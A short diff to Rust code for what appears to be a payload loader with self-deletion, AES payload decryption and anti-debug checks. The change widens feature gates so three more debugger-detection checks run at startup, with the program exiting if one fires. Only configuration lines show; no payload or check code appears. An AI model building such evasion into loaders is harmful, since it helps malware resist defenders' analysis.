@@ -5,7 +5,7 @@ mod benign;
 #[cfg(feature = "UtilitySelfDeletion")]
 mod utilities;
 
-#[cfg(any(feature = "CheckAntiDebugProcessDebugFlags"))]
+#[cfg(any(feature = "CheckAntiDebugProcessDebugFlags", feature = "CheckAntiDebugSystemDebugControl", feature = "CheckAntiDebugRemoteDebugger", feature = "CheckAntiDebugNtGlobalFlag"))]
 mod checks;
 
 #[cfg(any(feature = "TinyAES", feature = "CTAES"))]
@@ -101,7 +101,7 @@ fn decrypt_payload(encrypted: &[u8], key: &[u8], iv: &[u8]) -> Option<Vec<u8>> {
 fn main() {
 
     // Anti-debug checks - runs all enabled checks
-    #[cfg(any(feature = "CheckAntiDebugProcessDebugFlags"))]
+    #[cfg(any(feature = "CheckAntiDebugProcessDebugFlags", feature = "CheckAntiDebugSystemDebugControl", feature = "CheckAntiDebugRemoteDebugger", feature = "CheckAntiDebugNtGlobalFlag"))]
     {
         if checks::checks::run_all_checks() {
             std::process::exit(1);
